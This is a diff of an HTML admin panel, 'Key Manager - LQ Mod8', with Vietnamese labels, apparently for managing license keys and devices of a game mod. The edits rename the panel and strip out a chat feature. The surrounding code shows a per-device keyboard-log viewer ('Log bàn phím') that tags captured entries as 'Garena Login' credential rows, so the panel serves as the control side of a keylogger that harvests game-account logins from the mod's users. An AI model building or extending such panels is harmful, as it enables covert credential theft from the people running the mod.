@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔐 Key Manager - LQ Mod6</title>
+<title>🔐 Key Manager - LQ Mod8</title>
 <style>
   :root {
     --bg: #0a0e1a;
@@ -848,7 +848,6 @@ function renderTable() {
     const maxDev     = k.maxDevices || 1;
     const onlineCnt  = k.onlineDevices || 0;
     const devColor   = devCount >= maxDev ? 'var(--red)' : 'var(--accent)';
-    const unreadAll  = (k.devices||[]).reduce((s,d)=>s+(d.unreadCount||0),0);
 
     // Escape key for onclick
     const keyEsc = k.key.replace(/'/g, "\\'");
@@ -864,7 +863,6 @@ function renderTable() {
         <span class="dev-badge" onclick="openDevices('${keyEsc}')" title="Xem thiết bị" style="position:relative;cursor:pointer">
           📱 <span class="count" style="color:${devColor}">${devCount}</span>/${maxDev}
           ${onlineCnt > 0 ? `<span style="color:#22c55e;font-size:11px;font-weight:700"> 🟢${onlineCnt}</span>` : ''}
-          ${unreadAll > 0 ? `<span style="background:#f97316;color:#fff;border-radius:8px;padding:1px 5px;font-size:10px;font-weight:700;margin-left:4px">💬${unreadAll}</span>` : ''}
         </span>
       </td>
       <td style="color:${days>0&&effStatus==='valid'?'var(--green)':'var(--red)'};">${daysStr}</td>
@@ -927,17 +925,13 @@ function renderDevicesList(key, filterQ) {
     const onlineDot = isOnline
       ? `<span style="display:inline-block;width:8px;height:8px;background:#22c55e;border-radius:50%;margin-right:4px;vertical-align:middle" title="Đang online"></span>`
       : `<span style="display:inline-block;width:8px;height:8px;background:#ef4444;border-radius:50%;margin-right:4px;vertical-align:middle" title="Offline"></span>`;
-    const unread = d.unreadCount || 0;
-    const unreadBadge = unread > 0
-      ? `<span style="background:#f97316;color:#fff;border-radius:8px;padding:1px 6px;font-size:10px;font-weight:700;margin-left:6px">💬${unread}</span>`
-      : '';
 
     return `
     <div class="device-item" id="ditem-${realIdx}">
       <div style="display:flex;justify-content:space-between;align-items:flex-start">
         <div style="flex:1;min-width:0">
           <div style="font-size:11px;color:var(--text2);margin-bottom:4px;display:flex;align-items:center">
-            ${onlineDot}Thiết bị #${realIdx+1}${unreadBadge}
+            ${onlineDot}Thiết bị #${realIdx+1}
           </div>
           <div class="did" style="margin-bottom:4px;display:flex;align-items:center;gap:6px">
             <span title="${d.id}" style="cursor:pointer" onclick="copyText('${idEsc}')">ID: ${d.id}</span>
@@ -962,10 +956,6 @@ function renderDevicesList(key, filterQ) {
         <button class="btn btn-info btn-sm" style="font-size:11px;padding:4px 10px"
           onclick="openKeylogModal('${idEsc}','${nameEsc||idEsc}')">
           ⌨️ Log bàn phím
-        </button>
-        <button class="btn btn-sm" style="font-size:11px;padding:4px 10px;background:#7c3aed"
-          onclick="openChatAdmin('${idEsc}','${keyEsc}')">
-          💬 Chat${unread > 0 ? ` (${unread})` : ''}
         </button>
       </div>
     </div>`;
@@ -1722,7 +1712,7 @@ async function klLoadLog(deviceId) {
       return `<div class="kl-row${isGarenaLogin ? ' kl-row-cred' : ''}">
         <div class="kl-ts">
           <span>#${num} · ${ts}</span>
-          ${isGarenaLogin ? '<span class="kl-badge">🎮 Garena Login</span>' : '<span class="kl-badge kl-badge-chat">📝 Log</span>'}
+          ${isGarenaLogin ? '<span class="kl-badge">🎮 Garena Login</span>' : '<span class="kl-badge">📝 Log</span>'}
         </div>
         ${bodyHtml}
       </div>`;
@@ -1781,7 +1771,6 @@ function escapeHtml(s) {
 .kl-field-key { font-size:11px;color:var(--text2);white-space:nowrap;min-width:70px;padding-top:1px; }
 .kl-field-val { font-size:13px;color:var(--text1);word-break:break-all; }
 .kl-token     { font-size:11px;color:#a5b4fc;font-family:monospace; }
-.kl-badge-chat{ background:rgba(99,102,241,.15);color:#a5b4fc;border-color:rgba(99,102,241,.3); }
 </style>
 </body>
 </html>
